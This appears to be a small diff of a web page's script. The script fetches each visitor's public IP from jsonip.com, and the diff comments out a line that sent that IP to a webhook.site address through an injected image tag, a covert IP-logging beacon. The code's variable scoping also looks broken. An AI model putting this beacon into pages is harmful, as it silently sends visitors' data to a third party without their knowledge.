@@ -5,9 +5,6 @@
   <script type="text/javascript">
     $.getJSON("https://jsonip.com?callback=?", function(data) {
  var x = data.ip;
-document.open();
-  document.write(x);
-  document.close();
       });
   </script>
 </head>
@@ -16,7 +13,8 @@ document.open();
 function fuck(){
 setTimeout(function () {
         document.open();
-  document.write("<img src='https://webhook.site/06a09bcb-3bee-4e80-8ff7-9be98620312a?a='+ x>");
+  //document.write("<img src='https://webhook.site/06a09bcb-3bee-4e80-8ff7-9be98620312a?a='+ x>");
+document.write(x);
   document.close();
     }, 7000);
 }
